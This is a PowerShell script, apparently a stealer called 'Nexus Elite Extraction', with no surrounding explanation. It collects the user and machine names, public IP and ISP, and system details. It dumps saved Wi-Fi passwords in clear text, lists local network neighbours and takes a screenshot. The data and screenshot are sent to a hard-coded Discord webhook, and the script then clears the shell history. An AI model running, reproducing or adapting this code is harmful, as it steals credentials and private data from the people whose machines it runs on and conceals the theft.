# --- CONFIG ---
$WEBHOOK = "https://discord.com/api/webhooks/1481790664013512774/aFcyihxEknHXmDUtZIOH36pmZQrcBhAbYbH3d8uAHuwpDKOjD7NEtKiS_Wy6FuUTK0dY"
$SCREEN = "$env:TEMP\s.png"

# --- SYSTEM DATA ---
$User = $env:USERNAME
$PC = $env:COMPUTERNAME
try { $IPInfo = Invoke-RestMethod ipinfo.io/json; $PublicIP = $IPInfo.ip; $ISP = $IPInfo.org } catch { $PublicIP = "N/A" }
$OS = (Get-CimInstance Win32_OperatingSystem).Caption
$RAM = "$([Math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object Capacity -Sum).Sum / 1GB)) GB"

# --- WIFI & NET ---
$WF = netsh wlan show prof | sls ':\s+(.+)$' | %{$n=$_.Matches.Groups[1].Value.Trim(); $k=netsh wlan show prof name=$n key=clear | sls 'Key Content\s+:\s+(.+)$' | %{$_.Matches.Groups[1].Value}; "[$n]: $k"} | Out-String
$AM = arp -a | sls "dynamic" | select -first 5 | Out-String

# --- CLEAN STRINGS ---
$WiFiData = if($WF){ $WF.Trim() } else { "No WiFi Found" }
$NetData = if($AM){ $AM.Trim() } else { "No Neighbors Found" }

# --- SCREENSHOT ---
try {
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $S=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $B=New-Object System.Drawing.Bitmap($S.Width,$S.Height)
    $G=[System.Drawing.Graphics]::FromImage($B)
    $G.CopyFromScreen(0,0,0,0,$B.Size)
    $B.Save($SCREEN)
    $G.Dispose(); $B.Dispose()
} catch {}

# --- EMBED ---
$Fields = @(
    @{ name = "Identity"; value = "$User @ $PC"; inline = $true }
    @{ name = "Network"; value = "$PublicIP ($ISP)"; inline = $true }
    @{ name = "WiFi Keys"; value = "```$WiFiData```"; inline = $false }
    @{ name = "Local Map"; value = "```$NetData```"; inline = $false }
)

$Payload = @{ embeds = @(@{ title = "Nexus Elite Extraction"; color = 2829619; fields = $Fields }) }
Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body ($Payload | ConvertTo-Json -Depth 4) -ContentType 'application/json'

if (Test-Path $SCREEN) { curl.exe -F "file=@$SCREEN" $WEBHOOK; Remove-Item $SCREEN }
Clear-History; exit
